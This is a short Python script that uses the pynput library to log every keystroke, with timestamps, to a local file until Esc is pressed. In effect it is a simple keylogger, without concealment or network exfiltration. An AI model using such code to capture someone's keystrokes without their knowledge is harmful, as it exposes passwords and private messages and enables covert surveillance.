from pynput.keyboard import Key, Listener
from datetime import datetime

def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        log = f"[{timestamp}] Key pressed: {key.char}\n"
    except AttributeError:
        log = f"[{timestamp}] Special Key pressed: {key}\n"

    with open("log.txt", "a") as f:
        f.write(log)

def on_release(key):
    if key == Key.esc:
        return False  # Stop the listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

